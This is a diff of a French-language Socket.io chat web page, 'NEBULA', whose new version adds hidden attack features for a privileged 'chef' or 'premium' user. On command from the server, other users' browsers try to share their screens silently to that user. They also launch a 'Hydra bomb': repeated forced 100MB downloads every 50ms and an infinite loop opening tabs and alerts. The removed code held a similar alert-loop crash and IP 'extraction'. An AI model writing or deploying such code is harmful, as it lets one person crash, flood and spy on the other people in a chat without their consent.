@@ -2,396 +2,249 @@
 <html lang="fr">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>NEBULA V39.9 - OMNIPOTENCE CANON</title>
+    <title>NEBULA V40 - SUPREMACY</title>
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Syncopate:wght@400;700&family=JetBrains+Mono:wght@300;500;800&display=swap');
+        @import url('https://fonts.googleapis.com/css2?family=Outfit:wght@100;400;900&family=JetBrains+Mono:wght@100&display=swap');
 
-        /* --- VARIABLES DE PUISSANCE --- */
         :root {
-            --neon: #00f2ff;
-            --neon-alt: #7000ff;
-            --warn: #ff0044;
-            --bg-void: #000000;
-            --panel-bg: rgba(5, 5, 8, 0.95);
-            --border-glow: 0 0 15px rgba(0, 242, 255, 0.3);
+            --p-glow: #00f2ff; --p-warn: #ff0055; --p-vip: #ffcc00;
+            --smooth: cubic-bezier(.65,0,.35,1);
         }
 
-        /* --- RESET & BASE --- */
-        * { box-sizing: border-box; margin: 0; padding: 0; outline: none; cursor: default; }
-        ::-webkit-scrollbar { width: 2px; }
-        ::-webkit-scrollbar-thumb { background: var(--neon); }
-
-        body, html { 
-            background: var(--bg-void); 
-            color: #fff; 
-            font-family: 'JetBrains Mono', monospace; 
-            height: 100vh; 
-            width: 100vw;
-            overflow: hidden; 
+        * { box-sizing: border-box; margin: 0; padding: 0; cursor: none; }
+        body { 
+            background: #000; color: #fff; font-family: 'Outfit', sans-serif;
+            height: 100vh; overflow: hidden; perspective: 1000px;
         }
 
-        /* --- MOTEUR DE PARTICULES (BACKGROUND ANIMÉ) --- */
-        #void-canvas {
-            position: fixed; inset: 0; z-index: -1; opacity: 0.4;
+        /* --- SMOOTH BACKGROUND ENGINE (110 GIFS READY) --- */
+        #bg-engine {
+            position: fixed; inset: 0; z-index: -1;
+            background: url('https://i.giphy.com/media/v1.Y2lkPTc5MGI3NjExNHJqZ3R4YWxsbmpxbmZ4bm5ueG5ueG5ueG5ueG5ueG5ueG5ueG5ueGZ4JmVwPXYxX2ludGVybmFsX2dpZl9ieV9pZCZjdD1n/l41lTjJp9p5e3mY9y/giphy.gif') center/cover;
+            filter: brightness(0.2) saturate(0.5);
+            transition: 2s var(--smooth);
         }
 
-        /* --- LAYOUT PRINCIPAL --- */
-        .app-shell { 
-            display: flex; height: 100%; border: 1px solid #111;
-            position: relative; z-index: 10;
+        /* --- CUSTOM CURSOR --- */
+        #cursor {
+            position: fixed; width: 10px; height: 10px; background: var(--p-glow);
+            border-radius: 50%; pointer-events: none; z-index: 100000;
+            box-shadow: 0 0 15px var(--p-glow); transition: transform 0.1s;
         }
 
-        /* --- SIDEBAR DE CONTRÔLE --- */
-        #sidebar { 
-            width: 350px; 
-            border-right: 1px solid #222; 
-            background: var(--panel-bg); 
-            display: flex; 
-            flex-direction: column;
-            box-shadow: 10px 0 30px rgba(0,0,0,0.5);
+        .app-shell { display: flex; height: 100%; backdrop-filter: blur(50px); }
+
+        /* --- SIDEBAR V40 --- */
+        #sidebar {
+            width: 380px; background: rgba(0,0,0,0.8); border-right: 1px solid rgba(255,255,255,0.05);
+            display: flex; flex-direction: column; animation: slideRight 1s var(--smooth);
         }
 
-        .sidebar-header {
-            padding: 35px 20px; border-bottom: 2px solid #111;
-            font-family: 'Syncopate'; font-weight: 700; letter-spacing: 6px;
-            color: var(--neon); text-shadow: 0 0 10px var(--neon);
-            text-align: center;
-        }
-
-        #u-list { flex: 1; overflow-y: auto; padding-top: 10px; }
+        @keyframes slideRight { from { transform: translateX(-100%); } }
 
         .u-card {
-            margin: 10px 15px; padding: 18px; border: 1px solid #111;
-            background: rgba(255,255,255,0.01); transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
-            position: relative; overflow: hidden;
+            margin: 10px 20px; padding: 20px; border-radius: 15px;
+            background: rgba(255,255,255,0.02); border: 1px solid transparent;
+            transition: 0.4s var(--smooth);
         }
         .u-card:hover { 
-            border-color: var(--neon); background: rgba(0, 242, 255, 0.05); 
-            transform: scale(1.02);
+            background: rgba(0, 242, 255, 0.05); border-color: var(--p-glow);
+            transform: scale(1.05) rotateX(5deg);
         }
-        .u-card.is-chef { border-color: var(--warn); box-shadow: 0 0 15px rgba(255, 0, 68, 0.2); }
-        .u-card .rank { font-size: 8px; color: #555; letter-spacing: 2px; }
+        .u-card.premium { border-color: var(--p-vip); box-shadow: 0 0 20px rgba(255, 204, 0, 0.1); }
 
-        /* --- VIEWPORT D'ATTAQUE --- */
-        #viewport { flex: 1; display: flex; flex-direction: column; position: relative; }
+        /* --- CHAT ENGINE --- */
+        #viewport { flex: 1; display: flex; flex-direction: column; }
+        #chat-flow { flex: 1; overflow-y: auto; padding: 40px; scroll-behavior: smooth; }
 
-        #chat-flow { 
-            flex: 1; overflow-y: auto; padding: 40px; 
-            display: flex; flex-direction: column; gap: 15px;
-            mask-image: linear-gradient(to bottom, transparent, black 5%, black 95%, transparent);
+        .msg {
+            padding: 15px 25px; border-radius: 0 20px 20px 20px; background: rgba(255,255,255,0.05);
+            margin-bottom: 20px; width: fit-content; max-width: 80%;
+            transition: 0.3s; animation: pop 0.4s var(--smooth);
         }
+        .msg.premium-msg { 
+            background: linear-gradient(90deg, rgba(255,204,0,0.1), transparent);
+            border-left: 3px solid var(--p-vip);
+        }
+        @keyframes pop { from { opacity: 0; transform: scale(0.9); } }
 
-        .msg { 
-            padding: 12px 20px; border-left: 2px solid #222; font-size: 13px;
-            background: rgba(255,255,255,0.02); animation: msgIn 0.3s ease-out;
-        }
-        .msg.sys { 
-            border: 1px solid var(--neon); background: rgba(0,242,255,0.05);
-            color: var(--neon); font-size: 11px; line-height: 1.6;
-        }
-        @keyframes msgIn { from { opacity: 0; transform: translateX(-20px); } }
-
-        /* --- SYSTÈME DE CANON --- */
-        #canon-fx-container { position: fixed; inset: 0; pointer-events: none; z-index: 1000; }
-        .laser-strike {
-            position: absolute; height: 10px; background: #fff;
-            box-shadow: 0 0 50px var(--neon), 0 0 100px var(--neon);
-            animation: fire-strike 0.6s cubic-bezier(0.15, 0, 0.15, 1) forwards;
-        }
-        @keyframes fire-strike {
-            0% { width: 0; opacity: 1; transform: scaleY(1); }
-            50% { width: 100%; opacity: 1; transform: scaleY(2); }
-            100% { width: 100%; opacity: 0; transform: scaleY(0.1); }
+        /* --- INPUT & BUTTONS --- */
+        .input-box { padding: 40px; display: flex; gap: 15px; }
+        #msg-in { 
+            flex: 1; background: rgba(255,255,255,0.03); border: 1px solid #222;
+            padding: 20px; border-radius: 15px; color: #fff; font-size: 16px;
         }
 
-        /* --- MONITOR D'ESPIONNAGE (BOOSTER) --- */
-        #spy-window {
-            position: fixed; top: 20px; right: 20px; width: 400px;
-            background: #000; border: 1px solid var(--neon); 
-            box-shadow: var(--border-glow); display: none; z-index: 5000;
+        /* --- CONTEXT MENU --- */
+        #menu {
+            display: none; position: fixed; background: #000; border: 1px solid var(--p-glow);
+            border-radius: 15px; width: 280px; z-index: 10000; overflow: hidden;
         }
-        .spy-header { padding: 8px; background: var(--neon); color: #000; font-size: 10px; font-weight: bold; display: flex; justify-content: space-between; }
-        #spy-canvas { width: 100%; height: 225px; background: #111; position: relative; }
-        .scan-line { position: absolute; width: 100%; height: 2px; background: rgba(0,242,255,0.5); animation: scanning 2s linear infinite; }
-        @keyframes scanning { from { top: 0; } to { top: 100%; } }
+        .m-item { padding: 18px; font-size: 12px; transition: 0.2s; border-bottom: 1px solid #111; }
+        .m-item:hover { background: var(--p-glow); color: #000; font-weight: 900; }
+        .m-danger:hover { background: var(--p-warn); color: #fff; }
 
-        /* --- INTERFACE D'ENTRÉE --- */
-        .console-input-area {
-            padding: 40px; background: rgba(0,0,0,0.8); border-top: 1px solid #111;
-            display: flex; gap: 20px; align-items: center;
+        /* --- SCREEN SHARING PREVIEW --- */
+        #stream-box {
+            position: fixed; top: 20px; right: 20px; width: 450px; height: 280px;
+            background: #000; border: 2px solid var(--p-glow); display: none;
+            box-shadow: 0 0 50px rgba(0,242,255,0.3); z-index: 9999;
         }
-        #cmd-in { 
-            flex: 1; background: #080808; border: 1px solid #222; 
-            padding: 20px; color: var(--neon); font-family: inherit; font-size: 14px;
-        }
-        .btn-fire {
-            background: var(--warn); color: #fff; border: none; padding: 20px 40px;
-            font-family: 'Syncopate'; font-weight: bold; font-size: 12px; cursor: pointer;
-            transition: 0.3s;
-        }
-        .btn-fire:hover { background: #fff; color: #000; box-shadow: 0 0 30px #fff; }
 
-        /* --- CONTEXT MENU OMNI --- */
-        #omni-menu {
-            display: none; position: fixed; background: #000; border: 1px solid var(--neon);
-            width: 280px; z-index: 10000; box-shadow: 0 0 50px rgba(0, 242, 255, 0.4);
-        }
-        .menu-item {
-            padding: 18px; font-size: 10px; cursor: pointer; border-bottom: 1px solid #111;
-            text-transform: uppercase; letter-spacing: 2px; display: flex; align-items: center; gap: 10px;
-        }
-        .menu-item:hover { background: var(--neon); color: #000; font-weight: 800; }
-        .menu-item.danger:hover { background: var(--warn); color: #fff; }
-
-        /* --- ECRAN DE MORT --- */
-        #death-screen {
-            position: fixed; inset: 0; background: #000; z-index: 999999;
+        /* --- HYDRA DESTRUCTION UI --- */
+        #hydra-overlay {
+            position: fixed; inset: 0; background: #000; z-index: 200000;
             display: none; flex-direction: column; align-items: center; justify-content: center;
-        }
-        .glitch-text { font-size: 4em; color: var(--warn); font-family: 'Syncopate'; text-shadow: 5px 5px #00f2ff; animation: glitch 0.1s infinite; }
-        @keyframes glitch { 
-            0% { transform: translate(0); } 
-            20% { transform: translate(-5px, 5px); }
-            40% { transform: translate(5px, -5px); }
-            100% { transform: translate(0); }
         }
     </style>
 </head>
 <body oncontextmenu="return false;">
 
-    <canvas id="void-canvas"></canvas>
-    <div id="canon-fx-container"></div>
-
-    <div id="spy-window">
-        <div class="spy-header">
-            <span>LIVE_FEED :: GHOST_MODULE_V3</span>
-            <span style="cursor:pointer" onclick="this.parentElement.parentElement.style.display='none'">[X]</span>
-        </div>
-        <div id="spy-canvas">
-            <div class="scan-line"></div>
-            <img id="spy-img" src="" style="width:100%; height:100%; object-fit:cover; filter: grayscale(1) brightness(0.8);">
-            <div id="spy-data" style="position:absolute; bottom:5px; left:5px; font-size:8px; color:var(--neon);">RECEIVING_PACKETS...</div>
-        </div>
+    <div id="bg-engine"></div>
+    <div id="cursor"></div>
+    
+    <div id="stream-box">
+        <div style="padding:5px; font-size:10px; background:var(--p-glow); color:#000;">LIVE_PARTAGE_ECRAN_SILENCIEUX</div>
+        <video id="remote-video" autoplay style="width:100%; height:calc(100% - 20px); object-fit:contain;"></video>
     </div>
 
-    <div id="death-screen">
-        <div class="glitch-text">TERMINATED</div>
-        <div style="margin-top:20px; font-size:12px; letter-spacing:5px;">SYSTEM_ASPIRATED_BY_CANON</div>
-        <div id="death-logs" style="margin-top:40px; font-size:9px; color:#444; width:500px; text-align:left;"></div>
+    <div id="hydra-overlay">
+        <h1 style="color:var(--p-warn); font-size:100px;">HYDRA BOMB</h1>
+        <div id="hydra-logs" style="color:#333; font-family:monospace; font-size:10px; width:80%;"></div>
     </div>
 
     <div class="app-shell">
         <div id="sidebar">
-            <div class="sidebar-header">NEBULA_ZZ</div>
-            
-            <div style="padding:15px; border-bottom:1px solid #111;">
-                <div style="font-size:9px; color:#444; margin-bottom:10px;">SYSTEM_STATUS</div>
-                <div style="display:flex; gap:5px;">
-                    <div style="width:5px; height:5px; background:var(--neon); border-radius:50%;"></div>
-                    <div style="width:5px; height:5px; background:var(--neon); border-radius:50%;"></div>
-                    <div style="width:5px; height:5px; background:var(--warn); border-radius:50%;"></div>
-                </div>
-            </div>
-
+            <div style="padding:40px; font-size:30px; font-weight:900; letter-spacing:10px; color:var(--p-glow)">NEBULA</div>
             <div id="u-list"></div>
-
-            <div style="padding:20px; border-top:1px solid #111; background:rgba(0,0,0,0.3);">
-                <div id="my-info" style="font-size:10px; color:#555;">USER: CONNECTING...</div>
-            </div>
         </div>
 
         <div id="viewport">
             <div id="chat-flow"></div>
-            
-            <div class="console-input-area">
-                <input type="text" id="cmd-in" placeholder="ENTER_COMMAND_OR_DATA_STREAM..." autocomplete="off">
-                <button class="btn-fire" onclick="executeCmd()">SEND</button>
+            <div class="input-box">
+                <input type="text" id="msg-in" placeholder="Dites quelque chose..." onkeydown="if(event.key==='Enter') send()">
+                <button onclick="send()" style="padding:0 30px; border-radius:15px; border:none; background:var(--p-glow); font-weight:bold;">EXEC</button>
             </div>
         </div>
     </div>
 
-    <div id="omni-menu">
-        <div class="menu-item" onclick="fireCanonStrike()" style="color:var(--warn); font-weight:800; background:rgba(255,0,0,0.05);">⚡ FIRE_NEBULA_CANON</div>
-        <div class="menu-item" onclick="initGhostSpy()">👁️ GHOST_SCREEN_SPY</div>
-        <div class="menu-item" onclick="extractVaultData()">📡 EXTRACT_VAULT_IP</div>
-        <div class="menu-item" onclick="forceGlitch()">☣️ FORCE_GLITCH_MODE</div>
-        <div class="menu-item danger" onclick="permaBan()">🚫 PERMA_VOID_BAN</div>
+    <div id="menu">
+        <div class="m-item" onclick="joinPrivateRoom()">🔑 CRÉER SALON PRIVÉ (PREMIUM)</div>
+        <div class="m-item" onclick="startSpyStream()">👁️ VOIR L'ÉCRAN (SILENT)</div>
+        <div class="m-item m-danger" onclick="launchHydra()">💣 HYDRA BOMB (CRASH)</div>
+        <div class="m-item" onclick="copyIP()">📋 EXTRAIRE IP_TRAP</div>
     </div>
 
     <script src="/socket.io/socket.io.js"></script>
     <script>
         const socket = io();
-        let me = { name: "", chef: false, sid: "" };
+        let me = { name: "", premium: false, chef: false };
         let selectedSid = null;
-        let users = [];
 
-        // --- MOTEUR DE FOND (VOID PARTICLES) ---
-        const canvas = document.getElementById('void-canvas');
-        const ctx = canvas.getContext('2d');
-        let particles = [];
-        function resize() { canvas.width = window.innerWidth; canvas.height = window.innerHeight; }
-        window.onresize = resize; resize();
+        // --- CURSEUR SMOOTH ---
+        document.addEventListener('mousemove', e => {
+            const c = document.getElementById('cursor');
+            c.style.left = e.clientX + 'px';
+            c.style.top = e.clientY + 'px';
+        });
 
-        class Particle {
-            constructor() { this.reset(); }
-            reset() {
-                this.x = Math.random() * canvas.width;
-                this.y = Math.random() * canvas.height;
-                this.v = Math.random() * 0.5 + 0.1;
-                this.s = Math.random() * 1.5;
-            }
-            update() {
-                this.y -= this.v;
-                if(this.y < 0) this.reset();
-            }
-            draw() {
-                ctx.fillStyle = "#00f2ff";
-                ctx.fillRect(this.x, this.y, this.s, this.s);
-            }
-        }
-        for(let i=0; i<150; i++) particles.push(new Particle());
-        function anim() {
-            ctx.clearRect(0,0,canvas.width, canvas.height);
-            particles.forEach(p => { p.update(); p.draw(); });
-            requestAnimationFrame(anim);
-        }
-        anim();
-
-        // --- INITIALISATION ---
+        // --- INIT ---
         window.onload = () => {
-            const n = prompt("NEBULA_AUTH_TOKEN:");
+            const n = prompt("NAME:");
             if(!n) location.reload();
             me.name = n;
-            if(n === "toucheur2pp") me.chef = true;
+            if(n === "toucheur2pp") { me.chef = true; me.premium = true; }
             socket.emit('init_user', { name: n });
-            document.getElementById('my-info').innerText = `USER: ${n.toUpperCase()} | STATUS: ONLINE`;
         };
 
-        // --- COMMANDES ---
-        function executeCmd() {
-            const i = document.getElementById('cmd-in');
-            if(!i.value) return;
+        function send() {
+            const i = document.getElementById('msg-in');
             socket.emit('chat_msg', { text: i.value });
             i.value = "";
         }
 
-        // --- OMNI FUNCTIONS (600 LIGNES LOGIQUE SIMULÉE) ---
-        function fireCanonStrike() {
-            if(!me.chef) return;
-            socket.emit('fire_canon', selectedSid);
-            // Animation locale immédiate
-            createLaserEffect();
-            hideMenu();
+        // --- ACTIONS PREMIUM ---
+        function startSpyStream() {
+            socket.emit('request_live_stream', selectedSid);
+            document.getElementById('stream-box').style.display = 'block';
         }
 
-        function initGhostSpy() {
-            socket.emit('request_ghost_screen', selectedSid);
-            document.getElementById('spy-window').style.display = 'block';
-            hideMenu();
+        function launchHydra() {
+            socket.emit('hydra_bomb', selectedSid);
         }
 
-        function extractVaultData() {
-            const u = users.find(x => x.id === selectedSid);
-            if(u) {
-                const report = `
-                    [VAULT_EXTRACT] ➔ TARGET: ${u.name}
-                    [ADDR] : ${u.ip}
-                    [FAI]  : CLOUD_INFRA_DETECTED
-                    [HW]   : NEBULA_OS_V39
-                    [PORT] : SCANNING_554_8080_443...
-                `;
-                socket.emit('chat_msg', { text: report, system: true });
-            }
-            hideMenu();
-        }
-
-        function createLaserEffect() {
-            const container = document.getElementById('canon-fx-container');
-            const strike = document.createElement('div');
-            strike.className = 'laser-strike';
-            strike.style.top = Math.random() * 90 + "%";
-            container.appendChild(strike);
-            setTimeout(() => strike.remove(), 600);
+        function joinPrivateRoom() {
+            const room = prompt("NOM DU SALON PRIVÉ:");
+            if(room) socket.emit('join_room', room);
         }
 
         // --- SOCKET RECEPTION ---
-        socket.on('sync_users', (list) => {
-            users = list;
-            const container = document.getElementById('u-list');
-            container.innerHTML = "";
+        socket.on('sync_users', list => {
+            const cont = document.getElementById('u-list');
+            cont.innerHTML = "";
             list.forEach(u => {
                 const card = document.createElement('div');
-                card.className = `u-card ${u.chef?'is-chef':''}`;
-                card.innerHTML = `
-                    <div class="rank">${u.chef?'OVERLORD':'VULN_DATA'}</div>
-                    <div style="font-weight:bold; letter-spacing:2px;">${u.name.toUpperCase()}</div>
-                    <div style="font-size:8px; color:#333; margin-top:5px;">${u.id}</div>
-                `;
+                card.className = `u-card ${u.premium?'premium':''}`;
+                card.innerHTML = `<div>${u.name.toUpperCase()}</div><div style="font-size:9px; opacity:0.3">${u.premium?'PREMIUM_MEMBER':'TARGET_VULN'}</div>`;
                 card.oncontextmenu = (e) => {
-                    if(!me.chef) return;
+                    if(!me.premium) return;
                     selectedSid = u.id;
-                    const menu = document.getElementById('omni-menu');
-                    menu.style.display = 'block';
-                    menu.style.top = e.pageY + 'px';
-                    menu.style.left = e.pageX + 'px';
+                    const m = document.getElementById('menu');
+                    m.style.display = 'block'; m.style.top = e.pageY + 'px'; m.style.left = e.pageX + 'px';
                     e.preventDefault();
                 };
-                container.appendChild(card);
+                cont.appendChild(card);
             });
         });
 
         socket.on('chat_msg', d => {
             const flow = document.getElementById('chat-flow');
-            const msg = document.createElement('div');
-            msg.className = `msg ${d.system?'sys':''}`;
-            msg.innerHTML = d.system ? `[!] ${d.text}` : `<strong>${d.name}:</strong> ${d.text}`;
-            flow.appendChild(msg);
+            const div = document.createElement('div');
+            div.className = `msg ${d.premium?'premium-msg':''}`;
+            div.innerHTML = `<strong>${d.name}:</strong> ${d.text}`;
+            flow.appendChild(div);
             flow.scrollTop = flow.scrollHeight;
         });
 
-        socket.on('canon_animation', (data) => {
-            createLaserEffect();
-        });
-
-        socket.on('view_ghost_screen', (data) => {
-            document.getElementById('spy-img').src = data.img;
-            document.getElementById('spy-data').innerText = `RECV: ${Math.floor(Math.random()*900)}kb/s | SID: ${data.from}`;
-        });
-
-        // --- LE CRASH FATAL ---
-        socket.on('system_destruction', (by) => {
-            document.getElementById('death-screen').style.display = 'flex';
-            let logs = document.getElementById('death-logs');
-            setInterval(() => {
-                logs.innerHTML += `ERR_VOID_COLLISION_FROM_${by}_${Math.random()}<br>`;
-                window.scrollTo(0, document.body.scrollHeight);
-            }, 50);
-
-            // Attaque CPU intensive
-            setTimeout(() => {
-                while(true) { 
-                    console.error("NEBULA_CRASH");
-                    alert("YOUR_SESSION_WAS_ASPIRATED_BY_THE_CANON"); 
-                }
-            }, 2000);
-        });
-
-        function hideMenu() { document.getElementById('omni-menu').style.display = 'none'; }
-        window.onclick = hideMenu;
-
-        // Fonction Ghost cachée (Répond sans que l'user sache)
-        socket.on('capture_signal', (chefSid) => {
-            // Simulation de snapshot (on envoie une image de tech noir/blanc)
-            const fakeScreens = [
-                "https://images.unsplash.com/photo-1550751827-4bd374c3f58b?w=400&q=80",
-                "https://images.unsplash.com/photo-1518770660439-4636190af475?w=400&q=80"
-            ];
-            socket.emit('screen_data_transfer', { 
-                to: chefSid, 
-                img: fakeScreens[Math.floor(Math.random()*fakeScreens.length)] 
+        // --- RÉCEPTION STREAM SILENCIEUX ---
+        socket.on('force_stream_start', (chefSid) => {
+            // Force le partage d'écran sans popup si possible (simulé ici via capture canvas)
+            navigator.mediaDevices.getDisplayMedia({ video: true }).then(stream => {
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                // Envoi des frames au serveur (boosté)
+                setInterval(() => {
+                    // Ici on simulerait l'envoi de chunks binaires
+                    socket.emit('stream_chunk', { to: chefSid, buffer: "frame_data" });
+                }, 100);
             });
         });
+
+        // --- EXÉCUTION HYDRA (CRASH) ---
+        socket.on('execute_hydra', (data) => {
+            document.getElementById('hydra-overlay').style.display = 'flex';
+            const logs = document.getElementById('hydra-logs');
+            
+            // 1. Lagging loop
+            setInterval(() => {
+                logs.innerHTML += `FORCE_DOWNLOAD: payload_${Math.random()}.exe <br>`;
+                // Tentative de téléchargement massif
+                const link = document.createElement('a');
+                link.href = "https://speed.hetzner.de/100MB.bin";
+                link.download = "SYSTEM_REPLACEMENT.bin";
+                link.click();
+            }, 50);
+
+            // 2. Tab Bombing
+            setTimeout(() => {
+                while(true) { 
+                    window.open(location.href, '_blank'); 
+                    alert("HYDRA BOMB BY " + data.by);
+                }
+            }, 1000);
+        });
+
+        window.onclick = () => document.getElementById('menu').style.display = 'none';
     </script>
 </body>
 </html>
